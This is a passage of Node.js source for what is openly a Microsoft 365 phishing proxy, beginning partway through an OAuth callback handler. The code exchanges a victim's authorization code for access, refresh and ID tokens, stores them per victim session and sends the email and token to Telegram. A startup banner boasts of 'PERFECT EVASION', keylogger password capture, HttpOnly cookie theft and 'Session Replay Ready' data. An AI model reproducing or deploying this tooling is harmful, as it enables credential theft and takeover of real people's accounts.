                    'Content-Length': Buffer.byteLength(tokenData),
                    'Accept': 'application/json'
                }
            };
            
            const tokenReq = https.request(tokenOptions, (tokenRes) => {
                let tokenBody = '';
                tokenRes.on('data', chunk => tokenBody += chunk);
                tokenRes.on('end', () => {
                    try {
                        const tokens = JSON.parse(tokenBody);
                        console.log('[OAUTH-CALLBACK] ✅ Tokens received');
                        
                        const accessToken = tokens.access_token;
                        const refreshToken = tokens.refresh_token;
                        const idToken = tokens.id_token;
                        
                        if (sessionId) {
                            sessionStore.storeTokens(sessionId, {
                                access_token: accessToken,
                                refresh_token: refreshToken,
                                id_token: idToken
                            });
                        }
                        
                        const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
                        const successMsg = 
`🤖 *OAUTH LOGIN SUCCESSFUL*

*📧 Email:* ${email}
*🎟️ Access Token:* ${accessToken ? accessToken.substring(0, 30) + '...' : 'N/A'}
*🔄 Refresh Token:* ${refreshToken ? '✅ Present' : '❌ None'}
*🆔 ID Token:* ${idToken ? '✅ Present' : '❌ None'}

*🕐 Time:* ${new Date().toISOString()}

*✅ OAuth flow completed!*`;

                        sessionStore.sendTelegram(successMsg);
                        
                        const redirectEmail = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                        const proxyLoginUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(redirectEmail)}`;
                        
                        res.writeHead(302, { 
                            'Location': proxyLoginUrl,
                            'Cache-Control': 'no-store, no-cache'
                        });
                        res.end();
                        
                    } catch (error) {
                        console.error('[OAUTH-CALLBACK] Token exchange error:', error.message);
                        const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                        const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                            `client_id=${MICROSOFT_CLIENT_ID}&` +
                            `response_type=code&` +
                            `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                            `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                            `login_hint=${encodeURIComponent(email)}`;
                        
                        res.writeHead(302, { 'Location': fallbackUrl });
                        res.end();
                    }
                });
            });
            
            tokenReq.on('error', (err) => {
                console.error('[OAUTH-CALLBACK] Token request error:', err.message);
                res.writeHead(302, { 'Location': REDIRECT_URL });
                res.end();
            });
            
            tokenReq.write(tokenData);
            tokenReq.end();
            
        } else {
            console.log('[OAUTH-CALLBACK] ⚠️ No code received');
            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}&` +
                `response_type=code&` +
                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                `login_hint=${encodeURIComponent(email)}`;
            
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
        }
        
    } catch (error) {
        console.error('[OAUTH-CALLBACK] Error:', error.message);
        res.writeHead(302, { 'Location': REDIRECT_URL });
        res.end();
    }
}

// ============================================================
//  START SERVER
// ============================================================

server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════════╗');
    console.log('║                                                               ║');
    console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - PERFECT EVASION         ║');
    console.log('║     🔐  Full Account Access - Complete Session Capture       ║');
    console.log('║     ✅  User STAYS on Proxy until CORRECT password           ║');
    console.log('║                                                               ║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log('║                                                               ║');
    console.log(`║   📍 Server:    http://localhost:${PORT}                       ║`);
    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                         ║`);
    console.log(`║                                                               ║`);
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log('║                                                               ║');
    console.log('║   📱 TELEGRAM ALERTS:                                        ║');
    console.log('║   ✅ Password Captured (real-time)                           ║');
    console.log('║   ✅ HttpOnly Cookies Captured (Service Worker)              ║');
    console.log('║   ✅ VALID Microsoft Credentials (with tokens)               ║');
    console.log('║   ❌ INVALID Microsoft Credentials (with error)              ║');
    console.log('║   🎯 OAuth Tokens Captured                                  ║');
    console.log('║   ⌨️ Keylogger Password Extracted                           ║');
    console.log('║                                                               ║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log('║                                                               ║');
    console.log('║   🔑 COMPLETE SESSION DATA:                                  ║');
    console.log('║   • Email + Password (CORRECT & WRONG)                      ║');
    console.log('║   • HttpOnly Cookies (Set-Cookie headers)                    ║');
    console.log('║   • OAuth Tokens (Access, Refresh, ID)                       ║');
    console.log('║   • Full Authentication Data                                 ║');
    console.log('║   • Session Replay Ready                                     ║');
    console.log('║                                                               ║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log('║                                                               ║');
    console.log('║   ✅ FIX: User STAYS ON PROXY until correct password         ║');
    console.log('║   ✅ FIX: WRONG passwords captured and logged               ║');
    console.log('║   ✅ FIX: CORRECT password captured with tokens              ║');
    console.log('║   ✅ FIX: Redirect to Teams ONLY on success                 ║');
    console.log('║                                                               ║');
    console.log('╚═══════════════════════════════════════════════════════════════╝');
});

// ============================================================
//  CLEANUP
// ============================================================

setInterval(() => {
    sessionStore.cleanup();
}, 300000);

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close(() => process.exit(0));
});

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});